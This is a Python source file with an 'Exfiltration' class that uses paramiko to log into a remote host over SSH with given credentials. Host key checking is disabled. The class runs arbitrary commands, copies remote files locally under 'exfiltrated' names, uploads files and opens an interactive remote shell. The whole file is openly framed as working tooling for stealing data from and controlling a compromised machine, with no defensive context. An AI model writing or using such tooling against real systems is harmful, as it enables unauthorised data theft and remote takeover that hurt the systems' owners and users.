import os

import paramiko
import sys, select, termios, tty
class Exfiltration:
    def __init__(self, host, username, password):
        self.host = host
        self.username = username
        self.password = password
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.sftp = None
    
    def connect(self):
        self.client.connect(self.host, username=self.username, password=self.password)
        self.sftp = self.client.open_sftp()

    def execute_command(self, command):
        stdin, stdout, stderr = self.client.exec_command(command)
        return stdout.read().decode(), stderr.read().decode()

    def exfiltrate_data(self, path):
        try:
            self.sftp.get(path, f"data/exfiltrated_{path.split('/')[-1]}")
        except Exception as e:
            return f"Failed to exfiltrate {path}: {str(e)}"
        return f"Successfully exfiltrated {path}"
    
    def upload_file(self, local_path, remote_path):
        try:
            self.sftp.put(local_path, remote_path)
        except Exception as e:
            return f"Failed to upload {local_path} to {remote_path}: {str(e)}"
        return f"Successfully uploaded {local_path} to {remote_path}"
    
    def interactive_shell(self):
        channel = self.client.invoke_shell()
        
        old_tty = termios.tcgetattr(sys.stdin)
        try:
            tty.setraw(sys.stdin.fileno())
            channel.settimeout(0.0)
            
            while True:
                r, _, _ = select.select([channel, sys.stdin], [], [])
                
                if channel in r:
                    data = channel.recv(1024).decode()
                    if not data:
                        break
                    sys.stdout.write(data)
                    sys.stdout.flush()
                
                if sys.stdin in r:
                    data = sys.stdin.read(1)
                    if not data:
                        break
                    channel.send(data)
        finally:
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)

    def close(self):
        if self.sftp:
            self.sftp.close()
        self.client.close()